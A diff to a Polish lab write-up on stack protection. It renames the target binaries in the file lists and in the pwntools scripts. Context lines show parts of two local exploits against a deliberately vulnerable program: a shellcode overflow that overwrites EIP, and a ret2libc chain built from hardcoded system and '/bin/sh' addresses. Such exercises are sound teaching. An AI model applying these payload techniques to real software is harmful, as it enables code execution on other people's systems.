@@ -32,7 +32,7 @@ Różnice działania mechanizmu ochrony stosu w tych dwóch systemach jest margi
 
 PLIKI:
 1. `vuln.c`
-2. `vuln-1`
+2. `vuln-1.o`
 3. `exploit-1.py`
 
 
@@ -133,7 +133,7 @@ shellcode = """
 
 send = padding + p32(eip) + asm(shellcode)
 
-p = process('./vuln-1')
+p = process('./vuln-1.o')
 p.sendline(send)
 p.interactive()
 ```
@@ -161,7 +161,7 @@ Dla aplikacji z włączonym zabezpieczeniem exploit nie działa. Dostajemy sygna
 
 PLIKI:
 1. `vuln.c`
-2. `vuln-2`
+2. `vuln-2.o`
 3. `exploit-2.py`
 
 
@@ -247,7 +247,7 @@ bin_sh_addres = 0xf7f5733c
 
 send = padding + p32(system_addres) + p32(exit_addres) + p32(bin_sh_addres) 
 
-p = process('./vuln-2')
+p = process('./vuln-2.o')
 p.sendline(send)
 p.interactive()
 ```
